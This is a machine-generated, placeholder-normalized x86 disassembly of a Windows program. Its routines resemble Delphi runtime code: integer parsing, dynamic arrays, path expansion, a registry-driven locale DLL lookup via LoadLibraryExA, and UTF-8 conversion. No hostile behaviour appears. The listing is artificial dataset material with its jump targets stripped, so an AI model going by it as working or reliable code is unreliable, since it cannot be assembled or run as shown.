call sub_4028f0
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404b94
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404a78
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_405770
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_4050e8
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402850
sub_404b94
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_403f40
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_404608
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404a60
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404b94
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404a78
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_405770
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_4050e8
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402850
sub_404c90
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404cb4
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] edx
mov esi eax
mov ebp 0x1
xor edi edi
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] 0x0
test esi esi
jne r-xdata
cmp [ esi + ebp - 0x1 ] 0x20
je r-xdata
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
inc ebp
mov [ esp + 0x10 ] 0x0
mov al [ esi + ebp - 0x1 ]
cmp al 0x2d
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp al 0x2b
jne r-xdata
mov [ esp + 0x10 ] 0x1
inc ebp
jmp r-xdata
mov bl 0x1
cmp [ esi + ebp - 0x1 ] 0x24
je r-xdata
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov al [ esi + ebp - 0x1 ]
call sub_402930
cmp al 0x58
je r-xdata
inc ebp
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
jmp r-xdata
add dl 0xf9
sub dl 0x6
jb r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jae r-xdata
mov al [ esi + ebp ]
call sub_402930
cmp al 0x58
jne r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x37
jmp r-xdata
add dl 0xe6
sub dl 0x6
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
cmp [ esp + 0xc ] 0x0
jne r-xdata
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
mov edi eax
and edi 0xff
sub edi 0x57
jmp r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0xfffffff
jne r-xdata
jmp r-xdata
je r-xdata
cmp [ esp + 0x8 ] 0x0
cmp [ esp + 0xc ] 0xccccccc
jne r-xdata
jmp r-xdata
cmp [ esi + ebp - 0x1 ] 0x0
setne al
or bl al
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jmp r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xffffffff
jbe r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xcccccccc
jbe r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
mov eax edi
cdq
push edx
push eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
shld edx eax 0x4
shl eax 0x4
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
setl al
cmp [ esp + 0x8 ] 0x0
setb al
jmp r-xdata
push 0x0
push 0xa
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
call sub_404c90
push edx
push eax
mov eax edi
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jb r-xdata
dec ebp
cmp al [ esp + 0x10 ]
je r-xdata
sub_404f14
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404f0c
jmp r-xdata
mov al 0x4
call sub_402850
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402850
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_402734
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4026f4
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402b80
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404968
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028f0
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402b80
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_404ef4
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_404f14
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_4050ac
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_402714
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404968
sub_4050e8
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_4050ac
pop edx
pop eax
sub_405110
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_401304
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_405140
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_401294
mov eax esp
mov dl 0x1
call sub_40537c
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_405188
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_405140
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_4051c4
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_40129c
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_4012a4
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_4051b0
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_4051b0
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_4051b0
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call FindFirstFileA
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call FindClose
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_40537c
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_401294
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012ec
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_405481
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_4051c4
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4012f4
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4012ec
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012e4
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012f4
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012ec
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_4012b4
push eax
call sub_40128c
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_40561c
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_402714
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_402714
jmp r-xdata
sub_40567c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_4056b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_4056e8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_40574c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_40567c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405753
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_405770
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_40579c
test edx edx
je sub_405758
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402850
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_405840
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call InterlockedDecrement
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_405868
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_405944
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_405a7c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405b1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403eec
mov eax ebx
xor edx edx
call sub_404744
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405b22
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
mov eax ebx
call sub_404738
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_404538
mov eax ebx
call sub_404738
push eax
mov eax [ ebp - 0x4 ]
call sub_4041ac
inc eax
push eax
mov eax ebx
call sub_404728
push eax
mov eax [ ebp - 0x4 ]
call sub_4043ac
pop ecx
pop edx
call sub_405868
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403eec
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404538
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f40
sub_405b28
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405bbf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4045cc
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405bc6
lea eax [ ebp - 0x4 ]
call sub_4045cc
retn
mov eax ebx
call sub_4041ac
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_404814
mov eax ebx
call sub_4041ac
push eax
mov eax [ ebp - 0x4 ]
call sub_404738
inc eax
push eax
mov eax ebx
call sub_4043ac
push eax
mov eax [ ebp - 0x4 ]
call sub_404728
pop ecx
pop edx
call sub_405944
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_4045cc
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404814
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404608
sub_405bcc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405c0f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404718
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405a7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405c16
lea eax [ ebp - 0x4 ]
call sub_4045cc
retn
sub_405c1c
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_4040e4
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_405188
push eax
call sub_4012c4
mov ecx eax
mov edx esp
mov eax esi
call sub_403fdc
jmp r-xdata
sub_405c74
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405cda
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_40128c
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_40415c
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402ba0
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405ce1
lea eax [ ebp - 0x10 ]
call sub_403eec
retn
xor ebx ebx
sub_405ce8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405d32
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405d39
retn
mov eax rw-data
call sub_402a18
mov eax rw-data
call sub_402a18
mov eax rw-data
call sub_402a18
call sub_401af8
sub_405d3c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
